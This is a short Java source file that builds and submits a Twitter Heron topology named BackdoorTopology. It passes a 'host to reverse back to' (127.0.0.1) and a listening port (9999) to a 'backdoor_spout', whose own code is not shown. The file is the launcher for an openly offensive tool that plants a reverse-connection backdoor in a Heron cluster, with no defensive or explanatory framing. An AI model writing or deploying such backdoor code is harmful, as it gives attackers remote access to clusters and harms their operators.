import java.net.Inet4Address;

import com.twitter.heron.api.Config;
import com.twitter.heron.api.HeronSubmitter;
import com.twitter.heron.api.topology.TopologyBuilder;

/**
 * Created by TAISHI on 8/6/16.
 */
public class BackdoorTopology {
  public static void main(String[] args) throws Exception {
    TopologyBuilder builder = new TopologyBuilder();
    // host to reverse back to
    Inet4Address lhost = (Inet4Address) Inet4Address.getByName("127.0.0.1");
    // port that is listening
    int lport = 9999;

    builder.setSpout("backdoor_spout", new BackdoorSpout(lhost, lport), 1);
    builder.setBolt("consume_bolt", new ConsumeBolt(), 1).shuffleGrouping("backdoor_spout");

    Config conf = new Config();
    conf.setDebug(true);

    HeronSubmitter.submitTopology(args[0], conf, builder.createTopology());
  }
}
